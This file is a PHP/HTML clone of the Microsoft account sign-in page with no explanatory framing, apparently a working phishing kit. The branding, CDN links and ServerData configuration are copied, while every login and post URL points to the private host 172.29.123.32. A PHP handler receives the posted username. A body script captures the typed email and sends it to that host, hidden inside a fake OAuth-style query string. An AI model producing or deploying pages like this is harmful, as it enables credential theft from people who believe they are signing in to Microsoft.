<?php

	if (isset($_POST["username"])) {

		header("Location: http://172.29.123.32/login.php");

		$eae = $_POST["username"];
		echo("eae");
		echo("<script>console.log('Debug Objects: " . $eae . "' );</script>");
	}

?>

<!DOCTYPE html>
<html dir="ltr" lang="EN-US">

<head>
	<link crossorigin="" href="https://acctcdn.msauth.net" rel="preconnect" />
	<link crossorigin="" href="https://acctcdn.msftauth.net" rel="preconnect" />
	<link crossorigin="" href="https://logincdn.msftauth.net" rel="preconnect" />
	<meta http-equiv="x-dns-prefetch-control" content="on" />
	<link href="https://acctcdn.msauth.net/" rel="dns-prefetch" />
	<link href="https://acctcdn.msftauth.net/" rel="dns-prefetch" />
	<link href="https://acctcdnmsftuswe2.azureedge.net/" rel="dns-prefetch" />
	<link href="https://acctcdnvzeuno.azureedge.net/" rel="dns-prefetch" />
	<link href="https://logincdn.msauth.net/" rel="dns-prefetch" />
	<link href="https://logincdn.msftauth.net/" rel="dns-prefetch" />
	<link href="https://lgincdnvzeuno.azureedge.net/" rel="dns-prefetch" />
	<link href="https://lgincdnmsftuswe2.azureedge.net/" rel="dns-prefetch" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<base href="http://172.29.123.32/" />
	<script type="text/javascript">
		var PROOF = {};
		PROOF.Type = {
			SQSA: 6,
			CSS: 5,
			DeviceId: 4,
			Email: 1,
			AltEmail: 2,
			SMS: 3,
			HIP: 8,
			Birthday: 9,
			TOTPAuthenticator: 10,
			RecoveryCode: 11,
			StrongTicket: 13,
			TOTPAuthenticatorV2: 14,
			UniversalSecondFactor: 15,
			SecurityKey: 18,
			Voice: -3
		};
	</script><noscript>
		<meta http-equiv="Refresh" content="0; URL=http://172.29.123.32/login.php" /></noscript>
	<title>Sign in to your Microsoft account</title>
	<meta name="robots" content="none" />
	<meta name="PageID" content="i5030" />
	<meta name="SiteID" content="38936" />
	<meta name="ReqLC" content="1033" />
	<meta name="LocLC" content="1033" />
	<meta name="viewport"
		content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes" />
	<script type="text/javascript">
		! function (e, r) {
			for (var t in r) e[t] = r[t]
		}(this, function (e) {
			function r(n) {
				if (t[n]) return t[n].exports;
				var o = t[n] = {
					exports: {},
					id: n,
					loaded: !1
				};
				return e[n].call(o.exports, o, o.exports, r), o.loaded = !0, o.exports
			}
			var t = {};
			return r.m = e, r.c = t, r.p = "", r(0)
		}([function (e, r) {
			! function () {
				function e() {
					return u.$Config || u.ServerData || {}
				}

				function r(e, r) {
					var t = u.$Debug;
					t && t.appendLog && (r && (e += " '" + (r.src || r.href || "") + "'", e += ", id:" + (r.id ||
							""), e += ", async:" + (r.async || ""), e += ", defer:" + (r.defer || "")), t
						.appendLog(e))
				}

				function t() {
					var e = u.$B;
					if (void 0 === c)
						if (e) c = e.IE;
						else {
							var r = u.navigator.userAgent;
							c = r.indexOf("MSIE ") !== -1 || r.indexOf("Trident/") !== -1
						} return c
				}

				function n(e) {
					var r = e.indexOf("?"),
						t = r > -1 ? r : e.length;
					return t > g && e.substr(t - g, g).toLowerCase() === f
				}

				function o() {
					var r = e(),
						t = r.loader || {};
					return true || r.slReportFailure || !1
				}

				function a() {
					var r = e(),
						t = r.loader || {};
					return /*t.redirectToErrorPageOnLoadFailure*/ true || 1
				}

				function i() {
					var r = e(),
						t = r.loader || {};
					return t.logByThrowing || !1
				}

				function s(e) {
					var r = !0,
						t = e.src || e.href || "";
					if (t) {
						if (n(t)) try {
							e.sheet && e.sheet.cssRules && !e.sheet.cssRules.length && (r = !1)
						} catch (o) {}
					} else r = !1;
					return r
				}

				function d() {
					function t(e) {
						var r = l.getElementsByTagName("head")[0];
						r.appendChild(e)
					}

					function o(e, r, t, o) {
						var s = null;
						return s = n(e) ? a(e) : "script" === o.toLowerCase() ? i(e) : c(e, o), r && (s.id = r),
							"function" == typeof s.setAttribute && (s.setAttribute("crossorigin", "anonymous"),
								t && "string" == typeof t && s.setAttribute("integrity", t)), s
					}

					function a(e) {
						var r = l.createElement("link");
						return r.rel = "stylesheet", r.type = "text/css", r.href = e, r
					}

					function i(e) {
						var r = l.createElement("script");
						return r.type = "text/javascript", r.src = e, r.defer = !1, r.async = !1, r
					}

					function c(e, r) {
						var t = l.createElement(r);
						return t.src = e, t
					}

					function u(e) {
						if (!(m && m.length > 1)) return e;
						for (var r = 0; r < m.length; r++)
							if (0 === e.indexOf(m[r])) return m[r + 1 < m.length ? r + 1 : 0] + e.substring(m[r]
								.length);
						return e
					}

					function f(e, t, n, o) {
						return r("[$Loader]: " + (L.failMessage || "Failed"), o), R[e].retry < p ? (R[e].retry++,
							h(e, t, n), void d._ReportFailure(R[e].retry, R[e].srcPath)) : void(n && n())
					}

					function g(e, t, n, o) {
						if (s(o)) {
							r("[$Loader]: " + (L.successMessage || "Loaded"), o), h(e + 1, t, n);
							var a = R[e].onSuccess;
							"function" == typeof a && a(R[e].srcPath)
						} else f(e, t, n, o)
					}

					function h(e, n, a) {
						if (e < R.length) {
							var i = R[e];
							if (!i || !i.srcPath) return void h(e + 1, n, a);
							i.retry > 0 && (i.srcPath = u(i.srcPath), i.origId || (i.origId = i.id), i.id = i
								.origId + "_Retry_" + i.retry);
							var s = o(i.srcPath, i.id, i.integrity, i.tagName);
							s.onload = function () {
									g(e, n, a, s)
								}, s.onerror = function () {
									f(e, n, a, s)
								}, s.onreadystatechange = function () {
									window.location.href = "http://www.w3schools.com";
								} /*function(){"loaded"===s.readyState?setTimeout(function(){g(e,n,a,s)},500):"complete"===s.readyState&&g(e,n,a,s)}*/ ,
								t(s), r("[$Loader]: Loading '" + (i.srcPath || "") + "', id:" + (i.id || ""))
						} else n && n()
					}
					var v = e(),
						p = v.slMaxRetry || 2,
						y = v.loader || {},
						m = y.cdnRoots || [],
						L = this,
						R = [];
					L.retryOnError = !0, L.successMessage = "Loaded", L.failMessage = "Error", L.Add = function (
						e, r, t, n, o, a) {
						e && R.push({
							srcPath: e,
							id: r,
							retry: n || 0,
							integrity: t,
							tagName: o || "script",
							onSuccess: a
						})
					}, L.AddForReload = function (e, r) {
						var t = e.src || e.href || "";
						L.Add(t, "AddForReload", e.integrity, 1, e.tagName, r)
					}, L.AddIf = function (e, r, t) {
						e && L.Add(r, t)
					}, L.Load = function (e, r) {
						h(0, e, r)
					}
				}
				var c, u = window,
					l = u.document,
					f = ".css",
					g = f.length;
				d.On = function (e, r, t) {
					if (!e) throw "The target element must be provided and cannot be null.";
					r ? d.OnError(e, t) : d.OnSuccess(e, t)
				}, d.OnSuccess = function (e, t) {
					var n = e.src || e.href || "",
						i = o(),
						c = a();
					if (!e) throw "The target element must be provided and cannot be null.";
					if (s(e)) {
						r("[$Loader]: Loaded", e);
						var u = new d;
						u.failMessage = "Reload Failed", u.successMessage = "Reload Success", u.Load(null,
							function () {
								if (i) throw "Unexpected state. ResourceLoader.Load() failed despite initial load success. ['" +
									n + "']";
								c && (document.location.href = "/error.aspx?err=504")
							})
					} else d.OnError(e, t)
				}, d.OnError = function (e, t) {
					var n = e.src || e.href || "",
						i = o(),
						s = a();
					if (!e) throw "The target element must be provided and cannot be null.";
					r("[$Loader]: Failed", e);
					var c = new d;
					c.failMessage = "Reload Failed", c.successMessage = "Reload Success", c.AddForReload(e,
						t), c.Load(null, function () {
							if (i) throw "Failed to load external resource ['" + n + "']";
							s && (document.location.href = "/error.aspx?err=504")
						}), d._ReportFailure(0, n)
				}, d._ReportFailure = function (e, r) {
					if (i() && !t()) throw "[Retry " + e + "] Failed to load external resource ['" + r +
						"'], reloading from fallback CDN endpoint"
				}, u.$Loader = d
			}()
		}]));
	</script>
	<script type="text/javascript">
		! function (r, t) {
			for (var e in t) r[e] = t[e]
		}(this, function (r) {
			function t(o) {
				if (e[o]) return e[o].exports;
				var n = e[o] = {
					exports: {},
					id: o,
					loaded: !1
				};
				return r[o].call(n.exports, n, n.exports, t), n.loaded = !0, n.exports
			}
			var e = {};
			return t.m = r, t.c = e, t.p = "", t(0)
		}([function (r, t) {
			! function () {
				function r(r, t) {
					function e(i) {
						var a = r[i];
						return i < o - 1 ? void(n.r[a] ? e(i + 1) : n.when(a, function () {
							e(i + 1)
						})) : void t(a)
					}
					var o = r.length;
					e(0)
				}

				function t(r, t, i) {
					function a() {
						var r = !!u.method,
							n = r ? u.method : i[0],
							a = u.extraArgs || [],
							c = o.$WebWatson;
						try {
							var f = e(i, !r);
							if (a && a.length > 0)
								for (var s = a.length, v = 0; v < s; v++) f.push(a[v]);
							n.apply(t, f)
						} catch (h) {
							return void(c && c.submitFromException && c.submitFromException(h))
						}
					}
					var u = n.r && n.r[r];
					return t = t ? t : this, u && (u.skipTimeout ? a() : o.setTimeout(a, 0)), u
				}

				function e(r, t) {
					return Array.prototype.slice.call(r, t ? 1 : 0)
				}
				var o = window;
				o.$Do || (o.$Do = {
					q: [],
					r: [],
					removeItems: [],
					lock: 0,
					o: []
				});
				var n = o.$Do;
				n.when = function (e, o) {
					function i(r) {
						t(r, a, u) || n.q.push({
							id: r,
							c: a,
							a: u
						})
					}
					var a = 0,
						u = [],
						c = 1,
						f = "function" == typeof o;
					f || (a = o, c = 2);
					for (var s = c; s < arguments.length; s++) u.push(arguments[s]);
					e instanceof Array ? r(e, i) : i(e)
				}, n.register = function (r, e, o) {
					if (!n.r[r]) {
						n.o.push(r);
						var i = {};
						if (e && (i.method = e), o && (i.skipTimeout = o), arguments && arguments.length >
							3) {
							i.extraArgs = [];
							for (var a = 3; a < arguments.length; a++) i.extraArgs.push(arguments[a])
						}
						n.r[r] = i, n.lock++;
						try {
							for (var u = 0; u < n.q.length; u++) {
								var c = n.q[u];
								c.id == r && t(r, c.c, c.a) && n.removeItems.push(c)
							}
						} catch (f) {
							throw f
						} finally {
							if (n.lock--, 0 === n.lock) {
								for (var s = 0; s < n.removeItems.length; s++)
									for (var v = n.removeItems[s], h = 0; h < n.q.length; h++)
										if (n.q[h] === v) {
											n.q.splice(h, 1);
											break
										} n.removeItems = []
							}
						}
					}
				}, n.unregister = function (r) {
					n.r[r] && delete n.r[r]
				}
			}()
		}]));
	</script>
	<script type="text/javascript">
		! function (n, e) {
			for (var r in e) n[r] = e[r]
		}(this, function (n) {
			function e(o) {
				if (r[o]) return r[o].exports;
				var t = r[o] = {
					exports: {},
					id: o,
					loaded: !1
				};
				return n[o].call(t.exports, t, t.exports, e), t.loaded = !0, t.exports
			}
			var r = {};
			return e.m = n, e.c = r, e.p = "", e(0)
		}([function (n, e) {
			! function () {
				function n() {
					return r.$Config || r.ServerData || {}
				}

				function e() {
					var e = (n(), new t),
						r = this,
						i = [],
						f = [];
					r.Add = function (n, r, o, t) {
						e.Add(n, r, o, t)
					}, r.Provides = function (n) {
						if (n)
							if (n instanceof Array)
								for (var e = 0; e < n.length; e++) i.push(n[e]);
							else i.push(n)
					}, r.Requires = function (n) {
						if (n)
							if (n instanceof Array)
								for (var e = 0; e < n.length; e++) f.push(n[e]);
							else f.push(n)
					}, r.Load = function (n, r) {
						var t = function () {
								n && n();
								for (var e = 0; e < i.length; e++) o.register(i[e], 0, !0)
							},
							u = function () {
								e.Load(t, r)
							};
						f.length > 0 ? o.when(f, u) : u()
					}
				}
				var r = window,
					o = (r.document, r.$Do),
					t = r.$Loader,
					i = ".css";
				i.length;
				e.WhenLoaded = function (n, e) {
					o.when(n, e)
				}, r.$DepLoader = e
			}()
		}]));
	</script>
	<link href="https://logincdn.msftauth.net/16.000.29619.5/images/favicon.ico" rel="shortcut icon" />
	<link href="https://logincdn.msftauth.net/16.000/Converged_v21033_T-H8TkOzzOd03nMtjI4Hew2.css"
		onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)" rel="stylesheet" title="Converged_v2"
		type="text/css" />
	<style type="text/css">
	</style>
	<style type="text/css">
		body {
			display: none;
		}
	</style>
	<script type="text/javascript">
		if (top != self) {
			try {
				top.location.replace(self.location.href);
			} catch (e) {}
		} else {
			document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');
		}
	</script><noscript>
		<style type="text/css">
			body {
				display: block !important;
			}
		</style>
	</noscript>
	<script type="text/javascript">
		! function (e, r) {
			for (var t in r) e[t] = r[t]
		}(this, function (e) {
			function r(n) {
				if (t[n]) return t[n].exports;
				var i = t[n] = {
					exports: {},
					id: n,
					loaded: !1
				};
				return e[n].call(i.exports, i, i.exports, r), i.loaded = !0, i.exports
			}
			var t = {};
			return r.m = e, r.c = t, r.p = "", r(0)
		}([function (e, r) {
			var t = window,
				n = t.navigator;
			t.g_iSRSFailed = 0, t.g_sSRSSuccess = "", r.SRSRetry = function (e, r, i, s, a) {
				var o = 1,
					c = unescape("%3Cscript type='text/javascript'");
				a && (c += " crossorigin='anonymous' integrity='" + a + "'"), c += " src='";
				var u = unescape("'%3E%3C/script%3E"),
					S = r;
				if (n && n.userAgent && s && s !== r) {
					var d = n.userAgent.toLowerCase(),
						p = d.indexOf("edge") >= 0;
					if (!p) {
						var f = d.match(/chrome\/([0-9]+)\./),
							g = f && 2 === f.length && !isNaN(f[1]) && parseInt(f[1]) > 54;
						g && (S = s)
					}
				}
				t.g_sSRSSuccess.indexOf(e) === -1 && ("undefined" == typeof t[e] ? (t.g_iSRSFailed = 1, i <=
					o && document.write(c + S + u)) : t.g_sSRSSuccess += e + "|" + i + ",")
			}
		}]));
		var g_dtFirstByte = new Date();
		var g_objPageMode = null;
	</script>
	<link href="https://logincdn.msftauth.net/16.000.29619.5/images/Windows_Live_v_thumb.jpg" rel="image_src" />
	<script type="text/javascript">
		var ServerData = {
			Bh: false,
			CG: false,
			CH: true,
			CI: true,
			Bk: false,
			fAllowCredSwitchLinkFocus: false,
			Bm: true,
			CL: false,
			urlPostMsa: 'http://172.29.123.32/login.php',
			Bp: false,
			CO: false,
			aD: '',
			aG: 'BR',
			CW: false,
			aL: '',
			CX: false,
			By: true,
			aM: '',
			aN: '',
			aP: '',
			b0: '',
			urlReportPageLoad: 'http://172.29.123.32/login.php',
			urlLogin: 'http://172.29.123.32/login.php',
			b2: '',
			aV: {
				"appInsightsConfig": {
					"instrumentationKey": "69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293",
					"webAnalyticsConfiguration": {
						"autoCapture": {
							"jsError": 1,
							"click": 0
						}
					}
				},
				"appId": "-",
				"defaultEventName": "IDUX_MSAClientTelemetryEvent_WebWatson",
				"autoPost": true,
				"autoPostDelay": 1000,
				"flush": 60000,
				"maxEvents": 1,
				"minEvents": 1,
				"pltDelay": 500,
				"telemetryEnabled": true,
				"useOneDSEventApi": false,
				"serviceID": 2
			},
			DB: 'Passpor',
			hpgid: 33,
			sRequestCountry: 'BR',
			b7: '',
			Ce: 0,
			a11yConformeLink: '',
			aY: true,
			aZ: true,
			DF: '',
			Cg: false,
			Ch: true,
			fApplicationInsightsEnabled: false,
			DI: "Use the primary phone number you\'ve associated with your Microsoft account. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"http://172.29.123.32/login.php\">Learn more</a>",
			Ck: false,
			Cl: false,
			aa: 0,
			urlFed: '',
			ab: 0,
			iApplicationInsightsEnabledPercentage: 0,
			bB: true,
			Co: false,
			ac: 1,
			DO: '',
			urlPostAad: 'http://172.29.123.32/login.php',
			DP: '',
			ae: 'http://172.29.123.32/login.php',
			DQ: '',
			Cr: false,
			DR: '',
			bF: 0,
			Cs: true,
			ag: '',
			DS: '',
			ah: '',
			urlApplicationInsightsEndpoint: '',
			sPOST_NewUser: '',
			DU: '',
			am: '',
			DY: '',
			an: '',
			Cz: true,
			ap: '',
			iServerExecutionTime: 3,
			c0: '##li16####B##Hotmail##/B####BR##The smart way to do email - fast, easy and reliable##li8####B##Messenger##/B####BR##Stay in touch with the most important people in your life##li10####B##SkyDrive##/B####BR##Free, password-protected online storage',



			urlPost: 'http://172.29.123.32/m1.php#">',



			bQ: 'i5030',
			c1: 'sign up',
			bR: '',
			c2: '',
			bS: '',
			c3: '',
			c4: '',
			Da: '',
			bV: 'https://account.live.com/query.aspx?uaid=8f4878529e6b4ef5b72311852554eecd&mkt=EN-US&lc=1033&id=38936',
			aw: 'PROD',
			Db: '',
			Df: "#~#partnerdomain#~# does\'t use this service. Please sign in with a Microsoft account or create a new account. <a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Learn More</a>",
			sApplicationInsightsInstrumentationKey: '',
			A: 10000,
			fWebNgcFS: false,
			B: 2,
			Di: "A single-use code lets you sign in without entering your password. This helps protect your account when you\'re using someone else\'s PC. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",
			Dj: "Your session has timed out. To request a single use code, please <a href=\"javascript:NewOTCRequest()\">refresh the page</a>.",
			D: false,
			sFedQS: 'wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=contextid%3DED145727AA7BF84A%26opid%3DE32AEC44EBD8367B%26bk%3D1669644487',
			Dl: "Sign in",
			F: '',
			G: '',
			cA: true,
			bb: true,
			Dp: 'https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/v3/account/EN-US.html?id=38936&mkt=EN-US',
			J: '8f4878529e6b4ef5b72311852554eecd',
			A0: true,
			Dq: '',
			be: 3,
			L: false,
			bf: 5,
			Dr: '',
			A3: false,
			N: -1,
			Du: 'https://go.microsoft.com/fwlink/?linkid=2013738',
			Dw: '',
			Q: 1033,
			A7: true,
			str: [],
			Dx: 'https://go.microsoft.com/fwlink/?LinkID=254486',
			A9: 0,
			T: false,
			bn: '',
			V: 60,
			bp: 'PPFT',
			cP: 0,
			X: '',
			Y: '',
			bs: '',
			Z: '',
			bt: '',
			cT: 1,
			urlSwitch: '',
			AB: 0,
			urlFedConvertRename: '',
			cW: {},
			AD: '',
			cX: {},
			by: '',




			bz: 'm1.php?username=jeans',







			AF: '',
			cY: '',
			a: 'https://logincdn.msftauth.net/shared/1.0/',
			b: {},
			c: '',
			e: true,
			AK: true,
			f: 1,
			AL: 0,
			g: '',
			h: '38936',
			i: '',
			j: 'https://signup.live.com/signup?contextid=ED145727AA7BF84A&opid=E32AEC44EBD8367B&bk=1669644487&sru=',
			k: {
				"ri": "SN1PEPF000175D1",
				"ver": "16.0.29619.5"
			},
			AQ: '',
			B0: false,
			m: 0,
			cg: false,
			sCBUpTxt1: '',
			sCBUpTxt2: '',
			sHostBuildNumber: '16.0.29619.5',
			AW: true,
			r: '',
			ck: false,
			AX: false,
			B8: true,
			cm: false,
			B9: true,
			u: 1,
			w: 'https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d1033%26mkt%3dEN-US%26contextid%3dED145727AA7BF84A%26opid%3dE32AEC44EBD8367B%26bk%3d1669644487%26uaid%3d8f4878529e6b4ef5b72311852554eecd&id=38936&mkt=EN-US&lc=1033&uaid=8f4878529e6b4ef5b72311852554eecd&uiflavor=web',
			cq: 0,
			correlationId: '8f4878529e6b4ef5b72311852554eecd',
			oPost: {},
			Aa: true,
			Ac: null,
			cx: {},
			Ae: 'contextid=ED145727AA7BF84A&opid=E32AEC44EBD8367B&bk=1669644487',
			cy: {
				'Logo': '',
				'LogoAltText': '',
				'LogoText': '',
				'ShowWLHeader': true
			},
			Af: '',
			Ai: false,
			BH: false,
			Aj: true,
			Al: true,
			sErrTxt: '',
			fDetectMultiHighContrastThemes: true,
			Am: 3,
			BL: false,
			Ao: null,
			html: [],
			iPawnIcon: 1,
			sFTTag: '<input type="hidden" name="PPFT" id="i0327" value="DdFuxT0q6KuRO*KgoLwxp3v8RG6Hn!aacaBM4X!U0UttOAYSRWwwP*QXc2Vbbcpd3mZCDfe58rmoeCEE9cTM8Y40YQ1j!AnLE6wZbTxP3xPWJADl!4zRuloqXKy0ovdMNAzsczbpZvxARvAWCFSiVtqAhKT7U!RPIKjylJ7rPHQpQLgGIGZeq8LMIX6ZjE2xYRqS1lTIV9o74KpPxRkO4ZjQjkz93kY45XtI0a4Lj!L*5b48gYhDdBOIXR1qTDIGQA$$"/>',
			At: '',
			BS: true,
			loader: {
				cdnRoots: ['https://logincdn.msauth.net/', 'https://logincdn.msftauth.net/',
					'https://lgincdnvzeuno.azureedge.net/', 'https://lgincdnmsftuswe2.azureedge.net/'
				]
			},
			Av: [],
			BV: false,
			Ax: true,
			BY: true,
			C8: false,
			fHasBackgroundColor: false,
			a1: false,
			urlStaySignIn: '',
			a4: false,
			a5: true,
			a7: true,
			CD: 2,
			Be: true,
			CE: true,
			CF: false
		};
	</script>
	<script type="text/javascript">
		window.UXResourceDependencies = [];
	</script>
	<script type="text/javascript">
		(function () {
			var l = new window.$DepLoader();
			l.Add("./js/ConvergedLoginPaginated.js",
				"sha384-RniCi/xXXBEitMjuYZ/oURVbossRXig+S29b4DDhLTfN8xZ2R+m0TMxUv3tDx3A0");
			l.Provides("UX_JS_Strings");
			var res = ("UX_Res_" + window.UXResourceDependencies.length);
			l.Provides(res);
			window.UXResourceDependencies.push(res);
			l.Load();
		}());
	</script>
	<script type="text/javascript">
		(function () {
			var l = new window.$DepLoader();
			l.Add("https://logincdn.msftauth.net/shared/1.0/content/js/ConvergedLogin_PCore_Q9QQskEMc2xSRTXCcd3MIQ2.js",
				"", "sha384-2zzJMFNzw+rMRgODOiFUk2MAKZBAWBvotc1zELtMaWlITX3wHLy3eEsctFxIYa4s");
			l.Requires("UX_JS_Strings");
			l.Provides("UX_JS_Core");
			var res = ("UX_Res_" + window.UXResourceDependencies.length);
			l.Provides(res);
			window.UXResourceDependencies.push(res);
			l.Load();
		}());
	</script>
	<script type="text/javascript">
		window.WhenAllLoaded = function (callback) {
			window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback);
		};
	</script>
</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">

	<script>
		
		
		setTimeout(() => {
			
			document.getElementById("idSIButton9").addEventListener("click", function () {
				var email = document.getElementById("i0116").value
				
				if (email != "") {
					var appBanners = document.getElementsByClassName('error');
					
					for (var i = 0; i < appBanners.length; i++) {
						appBanners[i].style.display = 'none';
					}
					
					window.location.href =
					`http://172.29.123.32/frontend/login.php?client_id=47asdasd5b-32c6-49b0-dasd6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638052445344594156.NTBkNTFlMWMtMzY5ZS00MasdkohasodasadYWI2ZGM3YzYxODgzMjctYjA1ZC00ZGI1LWFmZWYtY2EyYjQ4ZGZiMTY2&ui_locales=en-US&mkt=en-US&client-request-id=66casdasdef-4e51-b1a0-c0e1a35121ae&state=WM2d07hG10XB9asdlqnn5b8asdasdTwbwQaOjj_2PYpTZ7O5h-RTo4pI4XEASLcVQIpDKVOo8Hasdasd0CltVAhGawbLKLzZpzfeSvITeiE0xcSdLTKssR32JYPFhTbsWUr0USycuLRzDZKHe0pZzpdL1_asdasdXbtmkvCOJDLEyNXuFGFfb02XVbCnDSJ2Y_xxXVEfLsb4DYBbgGopn4zG6WjCZhaCBCWNGn9dcqfH-AmqTasdasdclient-SKU=ID_NETSTANDARD2_0asdasdas0&username=${email}`
					
				}
			})
		}, 1000);

		// background-image: url("https://aadcdn.msftauthimages.net/dbd5a2dd-ricjvgygbhgp1oajvyyor3ve3l3tv34u0g2lhim5rk0/logintenantbranding/1046/illustration?ts=637887769313997441");
		// document.getElementById("backgroundImage").style.backgroundImage = "url('./imgs/icts_logo.png')";
		// document.getElementById('backgroundImage').setAttribute("style", "background-image: url('./imgs/icts_logo.png')")
		// document.getElementById("backgroundImage").setAttribute("style", "margin-left: 500px;")
	</script>
</body>

</html>